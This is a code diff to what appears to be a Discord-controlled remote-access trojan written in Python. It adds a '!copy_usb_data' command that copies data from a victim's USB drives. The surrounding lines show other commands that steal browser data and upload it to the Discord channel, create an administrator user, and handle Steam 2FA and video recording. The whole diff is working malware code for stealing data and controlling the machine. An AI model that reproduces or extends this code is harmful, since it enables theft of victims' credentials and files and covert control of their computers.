@@ -13,6 +13,7 @@ from features.steam2fa import *
 from features.video_record import *
 from features.windows import *
 from features.browsers.browsers import get_browesers_data
+from features.usb import copy_usbs_data
 import json
 import re
 
@@ -83,6 +84,8 @@ def main():
             await create_admin_user(await bot.get_context(message))
         elif re.match(r'!get_browser_data',message.content):
             await get_browser_data(await bot.get_context(message))
+        elif re.match(r'!copy_usb_data',message.content):
+            await copy_usb_data(await bot.get_context(message))
         elif re.match(r'!help',message.content):
             await help(await bot.get_context(message))
 
@@ -221,6 +224,19 @@ def main():
         browsers_data_path = get_browesers_data()
         await ctx.send(file=discord.File(browsers_data_path))
         os.remove(browsers_data_path)
+
+
+    @bot.command()
+    async def copy_usb_data(ctx):
+        if ctx.channel.name != generate_uuid():
+            return
+
+        result = copy_usbs_data()
+
+        if re.match(r'^\[ERROR\]', result):
+            await ctx.send(f"{result}")
+        else:
+            await ctx.send(f"copied usb data to: {result}")
 
 
     @bot.command()
